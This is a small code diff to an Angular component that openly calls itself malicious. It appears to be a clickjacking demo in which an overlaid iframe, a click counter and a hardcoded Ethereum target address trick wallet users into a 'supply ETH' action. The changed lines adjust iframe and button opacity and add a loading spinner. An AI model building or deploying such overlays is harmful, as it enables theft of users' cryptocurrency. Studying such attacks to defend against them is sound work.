@@ -8,11 +8,15 @@ declare let ethereum: any;
   styleUrl: './app.component.scss'
 })
 export class AppComponent implements AfterViewInit {
-  opacity: number = 1;
-  accountConnectedAddress: string = 'Not Connected';
-  supplyEth: boolean = false;
+  iframeOpacity: number = 0.5;
+  buttonOpacity: number = 1;
   supplyClickCounter: number = 0;
+
+  accountConnectedAddress: string = 'Not Connected';
   targetAddress: string = '0x5a3259eC4B7856d1C537e00a801E91E3d19c05cb';
+
+  supplyEth: boolean = false;
+  spinner: boolean = true;
 
   ngAfterViewInit() {
     this.connectToMaliciousSite();
@@ -53,6 +57,8 @@ export class AppComponent implements AfterViewInit {
       };
       iframe.src = iframe.src;
       this.supplyEth = true;
+      this.spinner = false;
+      this.iframeOpacity = 1
     } else {
       console.error('Iframe element not found.');
     }
